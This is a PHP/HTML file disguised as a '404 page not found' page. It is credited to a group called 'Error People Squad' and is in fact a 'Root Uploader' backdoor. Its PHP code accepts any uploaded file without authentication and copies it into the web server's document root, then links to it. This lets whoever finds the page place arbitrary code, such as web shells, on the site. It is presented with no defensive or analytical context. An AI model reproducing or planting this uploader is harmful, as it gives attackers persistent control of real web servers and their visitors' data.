<!-- Code By Error People Squad -->
<html lang='en-US'>
<head>
    <title>404 page not found</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <body bgcolor="black" link="aqua" text="aqua">
        <style>
            .link,
            .link:link,
            .link:active,
            .link:visited{
                background: 00000;
                color: white;
                text-decoration: none;
                padding: 10px;  
            }
            .link:hover{
                background: 0000;
            }
            .style1 {
                    font-family: Indie Flower;
                    font-size: 12px;
            }
        </style>
        <br><center><font><font size="6" color=white><font color=aqua> MiniOn Home </font>Root Uploader</font></center>
        <br><center><img src="http://tools.errorpeoplesquad.id/images/biglogo.png" width="300" height="300"></center>
        <br><br><center>
            <?php
            echo "<form method='post' enctype='multipart/form-data'>
            <input type='file' name='nimo'>
            <input type='submit' name='upload' value='upload'>
            </form>";
            if(isset($_POST['upload'])){
            $wibu = $_SERVER['DOCUMENT_ROOT'];
            $bawang = $_FILES['nimo']['name'];
            $tmp=$_FILES['nimo']['tmp_name'];
            $ibh = $wibu.'/'.$bawang;
                if(is_writable($wibu)) {
                    if(@copy($tmp, $ibh)) {
                        $web = "http://".$_SERVER['HTTP_HOST']."/";
                        echo "Sukses, file --><a href='$web/$bawang' target='_blank'><b><u>$web/$bawang</u></b></a>";
                    }
                    else {
                        echo "failed";
                    }
                }
                else {
                    if(@copy($tmp, $bawang)) {
                        echo "Sukses<b>$bawang</b>";
                    }
                    else {
                        echo "failed";
                    }
                }
            }
            ?>
            <br><br><br><br>
            <center><font face="Indie Flower"><font size="6" color=white><font color=aqua>Copyright &copy; 2019 -</font>-<a class="link" href='http://errorpeoplesquad.id/' target='_blank'> Error People Squad</font></a></center>
    </body>
</html>